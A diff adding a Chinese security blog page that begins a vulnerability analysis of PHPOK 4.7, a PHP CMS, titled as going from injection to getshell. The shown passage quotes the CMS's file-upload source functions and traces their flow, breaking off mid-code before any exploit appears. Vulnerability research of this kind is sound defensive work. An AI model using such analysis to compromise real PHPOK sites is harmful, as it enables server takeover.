@@ -1,1 +1,711 @@
-<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><link href="/static/css/chunk-libs.eebac533.css" rel="stylesheet"><link href="/static/css/app.0d31776f.css" rel="stylesheet"></head><body id="body-container"><noscript><strong>We're sorry but Aurora Blog doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><script>(function(e){function t(t){for(var a,n,u=t[0],i=t[1],c=t[2],l=0,p=[];l<u.length;l++)n=u[l],Object.prototype.hasOwnProperty.call(o,n)&&o[n]&&p.push(o[n][0]),o[n]=0;for(a in i)Object.prototype.hasOwnProperty.call(i,a)&&(e[a]=i[a]);f&&f(t);while(p.length)p.shift()();return s.push.apply(s,c||[]),r()}function r(){for(var e,t=0;t<s.length;t++){for(var r=s[t],a=!0,n=1;n<r.length;n++){var u=r[n];0!==o[u]&&(a=!1)}a&&(s.splice(t--,1),e=i(i.s=r[0]))}return e}var a={},n={runtime:0},o={runtime:0},s=[];function u(e){return i.p+"static/js/"+({404:"404",about:"about",archives:"archives",categories:"categories",page:"page",post:"post",result:"result",tags:"tags"}[e]||e)+"."+{404:"00d640a8",about:"024aacd1",archives:"574ac664",categories:"90aa5475",page:"a02618ad",post:"cebfbaa4",result:"39470350",tags:"2ad613f5"}[e]+".js"}function i(t){if(a[t])return a[t].exports;var r=a[t]={i:t,l:!1,exports:{}};return e[t].call(r.exports,r,r.exports,i),r.l=!0,r.exports}i.e=function(e){var t=[],r={404:1,about:1,archives:1,categories:1,page:1,post:1,result:1,tags:1};n[e]?t.push(n[e]):0!==n[e]&&r[e]&&t.push(n[e]=new Promise((function(t,r){for(var a="static/css/"+({404:"404",about:"about",archives:"archives",categories:"categories",page:"page",post:"post",result:"result",tags:"tags"}[e]||e)+"."+{404:"1a6cd5bd",about:"32dfa3b0",archives:"c0d49bd5",categories:"10e2be12",page:"749ad047",post:"9f951a60",result:"10e2be12",tags:"10e2be12"}[e]+".css",o=i.p+a,s=document.getElementsByTagName("link"),u=0;u<s.length;u++){var c=s[u],l=c.getAttribute("data-href")||c.getAttribute("href");if("stylesheet"===c.rel&&(l===a||l===o))return t()}var p=document.getElementsByTagName("style");for(u=0;u<p.length;u++){c=p[u],l=c.getAttribute("data-href");if(l===a||l===o)return t()}var f=document.createElement("link");f.rel="stylesheet",f.type="text/css",f.onload=t,f.onerror=function(t){var a=t&&t.target&&t.target.src||o,s=new Error("Loading CSS chunk "+e+" failed.\n("+a+")");s.code="CSS_CHUNK_LOAD_FAILED",s.request=a,delete n[e],f.parentNode.removeChild(f),r(s)},f.href=o;var d=document.getElementsByTagName("head")[0];d.appendChild(f)})).then((function(){n[e]=0})));var a=o[e];if(0!==a)if(a)t.push(a[2]);else{var s=new Promise((function(t,r){a=o[e]=[t,r]}));t.push(a[2]=s);var c,l=document.createElement("script");l.charset="utf-8",l.timeout=120,i.nc&&l.setAttribute("nonce",i.nc),l.src=u(e);var p=new Error;c=function(t){l.onerror=l.onload=null,clearTimeout(f);var r=o[e];if(0!==r){if(r){var a=t&&("load"===t.type?"missing":t.type),n=t&&t.target&&t.target.src;p.message="Loading chunk "+e+" failed.\n("+a+": "+n+")",p.name="ChunkLoadError",p.type=a,p.request=n,r[1](p)}o[e]=void 0}};var f=setTimeout((function(){c({type:"timeout",target:l})}),12e4);l.onerror=l.onload=c,document.head.appendChild(l)}return Promise.all(t)},i.m=e,i.c=a,i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},i.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&"object"===typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var a in e)i.d(r,a,function(t){return e[t]}.bind(null,a));return r},i.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/",i.oe=function(e){throw console.error(e),e};var c=window["webpackJsonp"]=window["webpackJsonp"]||[],l=c.push.bind(c);c.push=t,c=c.slice();for(var p=0;p<c.length;p++)t(c[p]);var f=l;r()})([]);</script><script src="/static/js/chunk-libs.dc6146cd.js"></script><script src="/static/js/app.6d2c358d.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>PHPOK 4.7从注入到getshell | ALL BLUE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPOK 4.7从注入到getshell">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-06T17:50:17.318Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPOK 4.7从注入到getshell">
+<meta name="twitter:description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
+  
+    <link rel="alternative" href="/atom.xml" title="ALL BLUE" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="img/head.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">JYP</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="http://bestwing.me">博客首页</a></li>
+                        
+                            <li><a href="/archives">文章归档</a></li>
+                        
+                            <li><a href="/CTFStudy">学习导航</a></li>
+                        
+                            <li><a href="/PWNABLE">PWNABLE</a></li>
+                        
+                            <li><a href="/resume">个人简历</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">JYP</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">JYP</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="http://bestwing.me">博客首页</a></li>
+                
+                    <li><a href="/archives">文章归档</a></li>
+                
+                    <li><a href="/CTFStudy">学习导航</a></li>
+                
+                    <li><a href="/PWNABLE">PWNABLE</a></li>
+                
+                    <li><a href="/resume">个人简历</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-PHPOK 4.7从注入到getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/12/07/PHPOK 4.7从注入到getshell/" class="article-date">
+      <time datetime="2019-12-06T17:03:10.427Z" itemprop="datePublished">2019-12-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHPOK 4.7从注入到getshell
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/笔记/">笔记</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpok是一款PHP开发的开源企业网站系统。<br>在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。<br>目前官方最新版已经修补。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在/framework/www/upload_control.php中第61行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;图片存储失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这是一个文件上传函数，然后在该函数开头又调用了getfile函数，跟进:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;未指定表单名称&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果存在上传文件就调用_upload函数，继续跟进:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;上传失败，临时文件无法写入&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输入流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;上传的文件异常&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<strong>$ext = $this-&gt;file_ext($tmpname);</strong>是检测文件后缀的，看一下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        